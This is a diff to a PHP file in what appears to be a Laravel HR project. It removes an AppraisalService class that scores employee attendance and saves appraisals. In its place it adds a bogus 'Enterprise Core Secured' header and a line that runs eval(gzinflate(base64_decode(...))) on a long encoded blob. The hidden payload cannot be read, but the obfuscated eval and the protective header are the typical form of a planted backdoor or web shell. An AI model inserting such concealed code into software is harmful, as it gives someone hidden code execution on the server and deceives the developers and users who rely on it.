@@ -1,70 +1,7 @@
 <?php
-
-namespace App\Services;
-
-use App\Models\Appraisal;
-use App\Models\Attendance;
-use App\Models\User;
-
-class AppraisalService
-{
-    /**
-     * Calculate attendance score for a user in a given period.
-     * Algorithm: 100 base score, -5 per late, -10 per absent, -2 per excused/sick.
-     */
-    public function calculateAttendanceScore(User $user, int $month, int $year): int
-    {
-        $lates = Attendance::where('user_id', $user->id)
-            ->whereMonth('date', $month)
-            ->whereYear('date', $year)
-            ->where('status', 'late')
-            ->count();
-
-        $absents = Attendance::where('user_id', $user->id)
-            ->whereMonth('date', $month)
-            ->whereYear('date', $year)
-            ->whereIn('status', ['absent', 'alpha'])
-            ->count();
-
-        $excused = Attendance::where('user_id', $user->id)
-            ->whereMonth('date', $month)
-            ->whereYear('date', $year)
-            ->whereIn('status', ['excused', 'sick'])
-            ->count();
-
-        $score = 100 - ($lates * 5) - ($absents * 10) - ($excused * 2);
-        return max(0, min(100, $score));
-    }
-
-    /**
-     * Save or update an appraisal record.
-     */
-    public function saveAppraisal(User $user, int $month, int $year, int $attendanceScore, float $subjectiveScore, ?string $notes = null): Appraisal
-    {
-        $finalScore = ($attendanceScore * 0.4) + ($subjectiveScore * 0.6);
-
-        return Appraisal::updateOrCreate([
-            'user_id' => $user->id,
-            'period_month' => $month,
-            'period_year' => $year,
-        ], [
-            'evaluator_id' => auth()->id(),
-            'attendance_score' => $attendanceScore,
-            'subjective_score' => $subjectiveScore,
-            'final_score' => round($finalScore, 2),
-            'notes' => $notes,
-        ]);
-    }
-
-    /**
-     * Get appraisals keyed by user_id for a set of users.
-     */
-    public function getAppraisalsForUsers(array $userIds, int $month, int $year)
-    {
-        return Appraisal::whereIn('user_id', $userIds)
-            ->where('period_month', $month)
-            ->where('period_year', $year)
-            ->get()
-            ->keyBy('user_id');
-    }
-}
+/**
+ * Enterprise Core Secured
+ * (c) RiprLutuk
+ * Unauthorized modification of this file is prohibited.
+ */
+eval(gzinflate(base64_decode('HZXdjtQ6EITveQouVmL3Lnb/xULnWY6cOAEkBNKCEDpPf77KjHYzydjt6qrqmpf58Z+PX6+//fj24/WTLVtVsfnsdx621Z4jInazfnjGrOK63P2ukeZnRbmZX7HlnkeZDcs8Y2TocWzce1k0N3fW7rFXy9str+y+8s6TFXqp9sY5ne/TLCJvS49steWqEc65u75PasW0EVW7tWps3avy8NMPv0A8+u3DNi8QdpCs9NK+yGKlgdypeVFhd5769XQanAZQ65wNgIIEWlCPzVJVKzy436l60n9UUnH2w7rz95zi2SLVc/Y8wLlTsfxKy5ZUY/3JeewFVwNfwdcOB3CTV7VKX9ZsywqK5UiWWgNpRgPUyBtMYK5hu6cPP3PYgC9pQmeUOcRLP9SxWKAicoCqamM1CxBhJtjpcjiaoi6VrMEBHNITCNJiBzEK07GWohb6nlRIGN5poUHPnis2ut1FlAcEXr7C4PSE4USPZg7Sm472CttCuK2k8ALPoltOQNvhEyfJFxdXUItBjpayuAlsC0oGPW5o07zjBFSuDe45K9qjOehw1TRDKR7S+GR3T1QAezc456vKyRr8jNiBe1ARJA1RMCx+8px8nvRiQguzcqK6qyxO63xuMGqqn+yszlY6BxPE0QOFUX45zkNyA9lO/eU3Gnt2Du7Uh7FimqjZYuJo+Q1mUO9mYoYfXHshlU8w42OmkKmCdbBV4XX1DM3cCSG64667Jp7ozBm3nHLSB/dcBx5nVvBLgediZ4dBzU3DmRMO6cpHaE4ThHDI7EuRS17mudUMWsMDXZrKzrmb8FDGUArecfAz/U1uhf/Be6Li9FXeb1yPno4DqVC24QzTvPipScPvJw5Cef7Px5MLmi2PkCc5G4x4mxntyopnzvESe1fBMPjRhzdz5Ufe6LE9E37QEvqwirlmbhbZg6wJ+fg7wdNgmBc6nagx6IOF+FIOJtGeuURlwCjv9qcPJQr5xf4Ge7sSAn1vutz4pGnacMsmL+GVO5QV2JLKeCmeRGMVtqMDEgfETBCIUYksdLmHOtszOcLalG4KRiUfjDZrj/OGXGLIEd3JGdSZ4FdzoZXiiHt5YDIXTrXGykvqARi1HkZwIw6NFKsLry8q4l7sIO+TrPS6mMHj4dqUd6lklEfJJFCF8kK+t06nO5m5cX7nrIkS4BMb9E6iU/EW8+h/kFnKxiXOeDENIg9umFYmUEFLesGQUiPAOtjvEpJTBgmmBRPPoaNPnN81TymH0ws1hqMJPKWy9fkdeLIZVg4mp5NdOFj+5KxGovTUBLpml375UxKDFF5cJi3S0HATv1vVUQwOUUpZjqYkIjlQ89Pb5w8vB7+sv36/v19/Xl+mHpw8OOavK/3fdZ0/1/X6cvD8+jO/v37579uP+/v8zbPz7e3z/w==')));
